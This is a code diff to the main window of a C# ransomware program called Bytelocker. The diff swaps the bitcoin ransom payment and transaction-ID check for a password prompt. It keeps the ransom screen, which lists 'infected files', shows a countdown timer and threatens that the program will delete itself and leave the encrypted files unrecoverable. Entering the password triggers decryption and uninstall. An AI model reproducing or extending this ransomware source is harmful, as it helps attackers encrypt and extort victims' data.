@@ -1,4 +1,5 @@
-﻿using Bytelocker.Installer;
+﻿using Bytelocker.CryptoManager;
+using Bytelocker.Installer;
 using Bytelocker.Settings;
 using Bytelocker.src.Tools;
 using Bytelocker.Tools;
@@ -12,8 +13,9 @@ namespace Bytelocker.UI
         private CommandManager cm;
         private TimeManager tm;
         private RegistryManager rm = new RegistryManager();
+        private PasswordManager pm;
 
-        private LinkLabel llAESInfo, llBitcoinAddress, llListOfInfectedFiles;
+        private LinkLabel llAESInfo, llListOfInfectedFiles;
 
         public MainWindow()
         {
@@ -23,11 +25,9 @@ namespace Bytelocker.UI
             this.tm = new TimeManager();
             this.tm.ReadFromRegistry();
             llAESInfo = new LinkLabel();
-            llBitcoinAddress = new LinkLabel();
             llListOfInfectedFiles = new LinkLabel();
             llListOfInfectedFiles.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llListOfInfectedFiles_Click);
             llAESInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llAESInfo_Click);
-            llBitcoinAddress.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llBitcoinAddress_Click);
         }
 
         // remove x button
@@ -49,14 +49,12 @@ namespace Bytelocker.UI
         private void MainWindowScreenOne()
         {
             this.BtnVerify.Hide();
-            this.pbBitcoinLogo.Hide();
-            this.tbTransID.Hide();
+            this.tbPassInput.Hide();
             this.BtnBack.Hide();
             this.rtfInfo.Clear();
             this.UpdateTime();
 
             llAESInfo.Show();
-            llBitcoinAddress.Show();
             llListOfInfectedFiles.Show();
             lbTitle.Show();
 
@@ -84,21 +82,9 @@ namespace Bytelocker.UI
             this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
 
             this.rtfInfo.AppendText("in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
-                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n" +
-                "To obtain the password, you will need to pay $" + Bytelocker.COST_TO_DECRYPT.ToString() + " USD or a similar amount in a different currency." +
-                "\n\n" + "Payment is accepted in bitcoin only which is an open-source cryptocurrency which funds can be transfered through computer or smartphone without" +
-                " interference of a bank or other financial institution" + "\n\n" + "You will need to send EXACTLY " + B64Manager.Base64ToString(rm.ReadStringValue(RegistryManager.SETTINGS_KEY_NAME, "p")) +
-                " bitcoin to the following address: (click to copy)" + "\n\n");
+                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n");
 
-            llBitcoinAddress.Text = Bytelocker.BITCOIN_ADDRESS;
-            llBitcoinAddress.AutoSize = true;
-            llBitcoinAddress.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
-            this.rtfInfo.Controls.Add(llBitcoinAddress);
-            this.rtfInfo.AppendText(llBitcoinAddress.Text);
-            this.rtfInfo.AppendText(new String(' ', 3));
-            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
-
-            this.rtfInfo.AppendText("\n\n" + "NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
+            this.rtfInfo.AppendText("NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
             // end rtf box
         }
 
@@ -106,18 +92,15 @@ namespace Bytelocker.UI
         {
             this.rtfInfo.Clear();
             llAESInfo.Hide();
-            llBitcoinAddress.Hide();
             llListOfInfectedFiles.Hide();
 
             this.lbTitle.Hide();
-            this.pbBitcoinLogo.Show();
-            this.tbTransID.Show();
+            this.tbPassInput.Show();
             this.BtnBack.Show();
             this.BtnVerify.Show();
 
-            this.rtfInfo.AppendText("\n\n\n\n\n\n" + "Enter the Transaction ID:" + "\n\n\n\n\n\n" + 
-                "Please make sure you enter the exact amount. Any transaction ID which reads incorrectly will not be accepted.");
-            this.rtfInfo.Select(this.rtfInfo.GetFirstCharIndexFromLine(6), this.rtfInfo.Lines[5].Length);
+            this.rtfInfo.AppendText("Enter password to unlock:");
+            this.rtfInfo.Select(this.rtfInfo.GetFirstCharIndexFromLine(0), this.rtfInfo.Lines[0].Length);
             this.rtfInfo.SelectionBullet = true;
             this.rtfInfo.DeselectAll();
         }
@@ -129,23 +112,18 @@ namespace Bytelocker.UI
 
         private void BtnVerify_Click(object sender, EventArgs e)
         {
-            if (NetworkTest.CheckForInternetConnection())
+            this.pm = new PasswordManager();
+            this.pm.FetchPassword();
+            if (!(this.tbPassInput.Text == this.pm.returnPassword()))
             {
-
-                if (!(Bytelocker.VerifyPayment(this.tbTransID.Text)))
-                {
-                    MessageBox.Show("Transaction ID invalid!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
-                else
-                {
-                    this.tmTimeLeftRefresher.Stop();
-                    this.lbTimeLeft.Text = "";
-                    Bytelocker.Decrypt();
-                    Bytelocker.Uninstall();
-                }
-            } else
+                MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            else
             {
-                MessageBox.Show("Could not connect to internet. Please check your connection.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                this.tmTimeLeftRefresher.Stop();
+                this.lbTimeLeft.Text = "";
+                Bytelocker.Decrypt();
+                Bytelocker.Uninstall();
             }
         }
 
@@ -165,10 +143,6 @@ namespace Bytelocker.UI
             System.Diagnostics.Process.Start("https://bitcoin.org/en/getting-started");
         }
 
-        private void On_llBitcoinAddress_Click(object sender, EventArgs e)
-        {
-            this.cm.CopyToClipboard(Bytelocker.BITCOIN_ADDRESS);
-        }
 
         private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
         {
@@ -197,6 +171,7 @@ namespace Bytelocker.UI
                 this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
             }
         }
+
 
         private void LaunchListOfEncryptedFilesWindow()
         {
